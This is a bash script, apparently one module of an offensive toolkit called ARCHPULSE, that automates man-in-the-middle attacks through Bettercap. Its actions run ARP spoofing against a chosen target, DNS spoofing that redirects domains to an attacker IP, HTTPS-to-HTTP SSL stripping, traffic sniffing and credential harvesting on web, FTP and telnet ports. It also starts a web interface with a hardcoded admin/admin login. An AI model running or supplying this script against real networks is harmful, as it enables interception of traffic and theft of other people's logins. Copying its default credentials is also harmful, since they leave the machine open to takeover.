#!/usr/bin/env bash
# ARCHPULSE - Bettercap Module
# Advanced MITM attacks automation

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/colors.sh"

echo -e "${C}╔══════════════════════════════════════════════════════════╗${N}"
echo -e "${C}║${N}              ${Y}🟠 BETTERCAP AUTOMATION${N}               ${C}║${N}"
echo -e "${C}╚══════════════════════════════════════════════════════════╝${N}"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    error "Bettercap requires root privileges. Run with sudo."
    exit 1
fi

# Check if bettercap is installed
if ! command -v bettercap &>/dev/null; then
    error "Bettercap not installed!"
    info "Install: sudo pacman -S bettercap"
    exit 1
fi

usage() {
    echo "Usage: $0 [action] [target] [interface]"
    echo ""
    echo "Actions:"
    echo "  mitm <target> <iface>     - Full MITM (ARP spoof + sniff)"
    echo "  arp <target> <iface>      - ARP spoof only"
    echo "  dns <iface> <domain> <ip> - DNS spoof (redirect domain to IP)"
    echo "  sslstrip <iface>          - SSL strip + HTTP proxy"
    echo "  sniff <iface>             - Passive sniffing"
    echo "  creds <iface>             - Credential harvesting"
    echo "  webui                     - Start web interface (admin:admin)"
    echo "  cli                       - Interactive CLI mode"
    echo ""
    echo "Examples:"
    echo "  $0 mitm 192.168.1.100 eth0"
    echo "  $0 dns eth0 example.com 10.0.0.1"
    echo "  $0 sslstrip eth0"
    echo "  $0 webui"
}

case "${1,,}" in
    mitm|full)
        TARGET="${2:-$(read -p 'Target IP: ' t && echo $t)}"
        IFACE="${3:-$(read -p 'Interface: ' i && echo $i)}"
        [ -z "$TARGET" ] && { error "Target required!"; exit 1; }
        [ -z "$IFACE" ] && IFACE="eth0"
        
        tool_banner "FULL MITM ATTACK" "Bettercap"
        info "Target: $TARGET"
        info "Interface: $IFACE"
        info "Starting MITM (ARP spoof + sniff)..."
        echo ""
        bettercap -eval "set arp.spoof.targets $TARGET; set arp.spoof.interface $IFACE; set net.sniff.local true; arp.spoof on; net.sniff on"
        ;;
    
    arp|arp-spoof)
        TARGET="${2:-$(read -p 'Target IP: ' t && echo $t)}"
        IFACE="${3:-$(read -p 'Interface: ' i && echo $i)}"
        [ -z "$TARGET" ] && { error "Target required!"; exit 1; }
        [ -z "$IFACE" ] && IFACE="eth0"
        
        tool_banner "ARP SPOOF" "Bettercap"
        bettercap -eval "set arp.spoof.targets $TARGET; set arp.spoof.interface $IFACE; arp.spoof on"
        ;;
    
    dns|dns-spoof)
        IFACE="${2:-$(read -p 'Interface: ' i && echo $i)}"
        DOMAIN="${3:-$(read -p 'Domain to spoof: ' d && echo $d)}"
        SPOOF_IP="${4:-$(read -p 'Redirect to IP: ' ip && echo $ip)}"
        [ -z "$IFACE" ] && IFACE="eth0"
        [ -z "$DOMAIN" ] && DOMAIN="*"
        [ -z "$SPOOF_IP" ] && SPOOF_IP="10.0.0.1"
        
        tool_banner "DNS SPOOF" "Bettercap"
        info "All DNS queries for ${DOMAIN} → ${SPOOF_IP}"
        bettercap -eval "set arp.spoof.interface $IFACE; set dns.spoof.all true; set dns.spoof.domain $DOMAIN; set dns.spoof.address $SPOOF_IP; arp.spoof on; dns.spoof on"
        ;;
    
    sslstrip)
        IFACE="${2:-$(read -p 'Interface: ' i && echo $i)}"
        [ -z "$IFACE" ] && IFACE="eth0"
        
        tool_banner "SSL STRIP (HTTPS→HTTP)" "Bettercap"
        bettercap -eval "set arp.spoof.interface $IFACE; set http.proxy.sslstrip true; http.proxy on; arp.spoof on"
        ;;
    
    sniff|passive)
        IFACE="${2:-$(read -p 'Interface: ' i && echo $i)}"
        [ -z "$IFACE" ] && IFACE="eth0"
        
        tool_banner "PASSIVE SNIFFER" "Bettercap"
        bettercap -eval "set net.sniff.interface $IFACE; set net.sniff.local true; net.sniff on"
        ;;
    
    creds|harvest)
        IFACE="${2:-$(read -p 'Interface: ' i && echo $i)}"
        [ -z "$IFACE" ] && IFACE="eth0"
        
        tool_banner "CREDENTIAL HARVESTER" "Bettercap"
        bettercap -eval "set net.sniff.interface $IFACE; set net.sniff.local true; set net.sniff.filter 'tcp port 80 or tcp port 443 or tcp port 21 or tcp port 23'; net.sniff on; set http.proxy.script /usr/share/bettercap/caplets/credential-harvester.cap; http.proxy on"
        ;;
    
    webui)
        tool_banner "WEB UI" "Bettercap"
        info "Starting web interface..."
        info "URL: http://127.0.0.1:80"
        info "Login: admin / admin"
        bettercap -eval "set api.rest.username admin; set api.rest.password admin; api.rest on; http-ui on"
        ;;
    
    cli|interactive)
        tool_banner "BETTERCAP CLI" "Bettercap"
        info "Starting interactive mode. Type 'help' for commands."
        bettercap
        ;;
    
    *)
        usage
        ;;
esac
